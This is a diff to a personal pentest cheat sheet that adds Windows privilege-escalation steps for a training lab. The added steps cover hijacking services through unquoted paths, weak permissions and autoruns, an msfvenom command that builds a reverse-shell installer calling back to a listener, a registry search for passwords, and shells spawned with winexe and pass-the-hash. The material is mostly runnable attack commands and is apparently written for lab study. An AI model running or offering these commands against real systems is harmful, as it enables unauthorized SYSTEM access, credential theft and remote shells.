@@ -67,6 +67,7 @@ Get-NetComputer -fulldata | select operatingsystem
 Get-NetUser | select cn
 
 #PowerShell
+Resource: https://learnxinyminutes.com/docs/powershell/
 
 #Using Get-Help
 Get-Help Command-Name
@@ -107,3 +108,85 @@ Verb-Noun | Sort-Object
 
 #IP address info
 Get-NetIPAddress
+
+#Sysinternals
+#Insecure Service Permissions with Accesschk
+#Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
+C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
+#Query the service
+sc qc daclsvc
+#start the service 
+net start daclsvc
+
+#Unquoted service path
+Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.
+sc qc unquotedsvc
+Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
+C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+Copy the reverse.exe executable you created to this directory and rename it Common.exe:
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+net start unquotedsvc
+
+#Weak registry permissions
+##Query the "regsvc" service
+sc qc regsvc
+#note if the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+#Service Exploits
+#Query the "filepermsvc" service
+sc qc filepermsvc
+Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:
+C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+Copy the reverse.exe executable you created and replace the filepermservice.exe with it:
+copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
+Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+net start filepermsvc
+
+#Autoruns
+Query the registry for AutoRun executables:
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:
+C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
+Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!
+rdesktop MACHINE_IP
+
+#AlwaysInstallElevated
+Query the registry for AlwaysInstallElevated keys:
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+Note that both keys are set to 1 (0x1).
+On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+Transfer the reverse.msi file to the C:\PrivEsc directory on Windows (use the SMB server method from earlier).
+Start a listener on Kali and then run the installer to trigger a reverse shell running with SYSTEM privileges:
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+#Passwords
+The registry can be searched for keys and values that contain the word "password":
+reg query HKLM /f password /t REG_SZ /s
+If you want to save some time, query this specific key to find admin AutoLogon credentials:
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
+winexe -U 'admin%password' //MACHINE_IP cmd.exe
+
+#List any saved credentials:
+cmdkey /list
+
+#Pass the hash
+Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
+pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe
+
+#Insecure GUI apps
+tasklist /V | findstr calc.exe
+click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
+Press Enter to spawn a command prompt running with admin privileges
+
+#Priv esc program resources
+winPEASany.exe
+Seatbelt.exe
+PowerUp.ps1
+SharpUp.exe
